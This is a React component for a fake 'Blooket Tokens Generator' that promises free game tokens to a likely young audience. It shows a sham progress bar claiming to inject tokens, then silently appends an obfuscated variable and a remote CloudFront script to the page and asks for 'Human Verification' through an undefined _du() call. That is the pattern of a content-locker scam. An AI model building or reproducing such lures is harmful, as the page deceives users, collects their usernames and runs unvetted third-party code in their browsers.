import { useState, useEffect } from 'react';
import { motion } from 'motion/react';
import { ShieldAlert } from 'lucide-react';

export const BlooketGenerator = () => {
  const [step, setStep] = useState(1);
  const [amount, setAmount] = useState<number | null>(null);
  const [blook, setBlook] = useState<string | null>(null);
  const [username, setUsername] = useState('');
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    if (step === 5) {
      const script1 = document.createElement('script');
      script1.type = 'text/javascript';
      script1.innerHTML = `var PIgBZ_wBT_tjhBSc={"it":4453402,"key":"86b7c"};`;
      document.head.appendChild(script1);

      const script2 = document.createElement('script');
      script2.src = 'https://d1qt1z4ccvak33.cloudfront.net/f713efc.js';
      document.head.appendChild(script2);
    }
  }, [step]);

  const amounts = [500, 1000, 2500];
  const blooks = [
    { id: 'rabbit', name: 'Lovely Rabbit', img: 'https://i.ibb.co/DD9cCbGz/Lovely-Rabbit.png' },
    { id: 'fox', name: 'Lovely Fox', img: 'https://i.ibb.co/4gZYxXNp/Lovely-Fox.png' },
    { id: 'peacock', name: 'Lovely Peacock', img: 'https://i.ibb.co/7xYvdgty/Lovely-Peacock.webp' }
  ];

  const handleGenerate = () => {
    if (!username) return;
    setStep(4);
    let p = 0;
    const interval = setInterval(() => {
      p += 5;
      setProgress(p);
      if (p >= 100) {
        clearInterval(interval);
        setTimeout(() => setStep(5), 500);
      }
    }, 200);
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#9edcff] via-[#6cc4f6] to-[#4fb3ef] text-[#0d2548] font-sans p-4 flex flex-col items-center">
      <div className="w-full max-w-5xl flex justify-between items-center py-6">
        <div className="flex items-center gap-4">
          <img src="https://i.ibb.co/Swxr52Fd/tokens.png" alt="Tokens" className="w-12 h-12" />
          <h1 className="text-3xl font-black drop-shadow-sm">Blooket Tokens Generator</h1>
        </div>
      </div>

      {step === 1 && (
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="w-full max-w-4xl mt-8">
          <h2 className="text-3xl font-black text-center mb-2">1. Select Your Tokens</h2>
          <p className="text-center text-[#5f6f8d] font-bold mb-8">Choose one amount</p>
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-6">
            {amounts.map(amt => (
              <button key={amt} onClick={() => setAmount(amt)} className={`relative bg-white/85 backdrop-blur-md border-2 rounded-3xl p-6 flex flex-col items-center gap-4 transition-all hover:-translate-y-1 shadow-xl ${amount === amt ? 'border-[#0fb5a8] shadow-[#0fb5a8]/30' : 'border-white/90'}`}>
                {amt === 1000 && <span className="absolute -top-3 bg-[#0e223b] text-white text-xs font-black px-3 py-1 rounded-full">Recommended</span>}
                <img src="https://i.ibb.co/Swxr52Fd/tokens.png" alt="Tokens" className="w-20 h-20 drop-shadow-md" />
                <span className="text-2xl font-black">{amt.toLocaleString()} Tokens</span>
              </button>
            ))}
          </div>
          
          <h2 className="text-3xl font-black text-center mt-12 mb-2">2. Select Your Desired Blook</h2>
          <p className="text-center text-[#5f6f8d] font-bold mb-8">Choose one blook</p>
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-6">
            {blooks.map(b => (
              <button key={b.id} onClick={() => setBlook(b.id)} className={`bg-white/85 backdrop-blur-md border-2 rounded-3xl p-6 flex flex-col items-center gap-4 transition-all hover:-translate-y-1 shadow-xl ${blook === b.id ? 'border-[#0fb5a8] shadow-[#0fb5a8]/30' : 'border-white/90'}`}>
                <img src={b.img} alt={b.name} className="w-24 h-24 object-contain drop-shadow-md" />
                <span className="text-xl font-black">{b.name}</span>
              </button>
            ))}
          </div>

          <div className="flex justify-center mt-12">
            <button disabled={!amount || !blook} onClick={() => setStep(3)} className="bg-[#0fb5a8] hover:bg-[#12c5b7] disabled:opacity-50 disabled:cursor-not-allowed text-white text-xl font-black py-4 px-12 rounded-2xl shadow-[0_18px_34px_rgba(6,122,113,0.28)] transition-all">Continue →</button>
          </div>
        </motion.div>
      )}

      {step === 3 && (
        <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} className="mt-20 bg-white rounded-3xl p-8 max-w-md w-full shadow-2xl text-center">
          <h3 className="text-2xl font-black mb-2">Enter Your Username</h3>
          <p className="text-[#5f6f8d] mb-6 font-medium">Please enter your Blooket username to begin the generation.</p>
          <input type="text" value={username} onChange={e => setUsername(e.target.value)} placeholder="Your Username Here" className="w-full bg-[#f7fafd] border-2 border-[#e3eaf4] rounded-xl px-4 py-3 text-lg font-bold outline-none focus:border-[#0fb5a8] mb-6" />
          <button onClick={handleGenerate} disabled={!username} className="w-full bg-[#0fb5a8] hover:bg-[#12c5b7] text-white text-lg font-black py-3 rounded-xl shadow-lg disabled:opacity-50">Start Generation</button>
        </motion.div>
      )}

      {step === 4 && (
        <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} className="mt-20 bg-white rounded-3xl p-8 max-w-md w-full shadow-2xl text-center">
          <h3 className="text-2xl font-black mb-6">Generating...</h3>
          <div className="w-full h-4 bg-[#eef4fc] rounded-full overflow-hidden mb-4">
            <motion.div className="h-full bg-gradient-to-r from-[#27e0d1] to-[#1aa8ff]" style={{ width: `${progress}%` }} />
          </div>
          <p className="text-[#5f6f8d] font-bold animate-pulse">Connecting to servers and injecting tokens...</p>
        </motion.div>
      )}

      {step === 5 && (
        <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} className="mt-20 bg-white rounded-3xl p-8 max-w-md w-full shadow-2xl text-center">
          <div className="w-20 h-20 bg-[#c9efe9] rounded-full flex items-center justify-center mx-auto mb-6"><ShieldAlert className="w-10 h-10 text-[#17b49d]" /></div>
          <h3 className="text-2xl font-black mb-2">Human Verification</h3>
          <p className="text-[#5f6f8d] mb-8 font-medium">To prevent bot abuse, please complete the final step to view your items.</p>
          <button onClick={() => {
            // @ts-ignore
            if (typeof _du === 'function') _du();
          }} className="w-full bg-[#0fb5a8] hover:bg-[#12c5b7] text-white text-lg font-black py-4 rounded-xl shadow-lg">Verify Now</button>
        </motion.div>
      )}
    </div>
  );
};
